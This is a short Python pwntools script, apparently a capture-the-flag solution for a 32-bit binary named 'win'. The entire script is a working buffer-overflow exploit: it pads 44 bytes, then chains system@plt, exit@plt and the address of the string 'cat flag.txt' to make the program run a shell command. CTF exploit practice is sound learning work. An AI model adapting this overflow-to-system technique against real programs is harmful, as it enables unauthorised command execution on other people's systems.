from pwn import *
BIN_PATH = "/mnt/c/Users/sharm/OneDrive/Documents/CWE_CTF_Sept/Pwn_Win_25/win"
context.binary = elf = ELF(BIN_PATH)

context.log_level = "info"

OFFSET =  44# ← fill from cyclic_find

system_plt = elf.plt["system"]
cat_str   = next(elf.search(b"cat flag.txt"))
exit_plt  = elf.plt.get("exit", 0)  # optional

payload  = b"A"*OFFSET
payload += p32(system_plt)
payload += p32(exit_plt or 0xdeadbeef)
payload += p32(cat_str)

io = process()     # or remote(HOST, PORT) if it’s a service
# send the payload where the vulnerable read happens:
io.sendline(payload)
print(io.recvall(timeout=2).decode("latin1","ignore"))
